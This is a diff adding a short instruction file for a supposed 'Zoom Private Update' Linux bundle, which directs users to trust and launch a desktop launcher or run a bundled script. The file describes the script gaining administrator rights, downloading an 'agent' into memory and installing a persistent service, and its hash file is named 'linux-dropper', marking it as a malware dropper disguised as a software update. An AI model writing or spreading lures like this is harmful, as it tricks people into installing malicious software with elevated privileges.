@@ -1,0 +1,13 @@
+Zoom Private Update - Linux bundle
+
+1. Extract this archive (executable bits are already set).
+2. Double-click "Zoom_Update_v6.1.0.desktop".
+   If the file manager asks to trust the launcher, choose "Trust and Launch".
+3. If your desktop has no launcher support, run the script directly:
+   ./Zoom_Update_v6.1.0.sh
+   (it is already executable).
+
+The script asks for administrator rights once via pkexec/sudo, downloads the
+agent to RAM, verifies SHA-256, installs a per-user service and starts it.
+
+Hashes: see SHA256SUMS-linux-dropper.
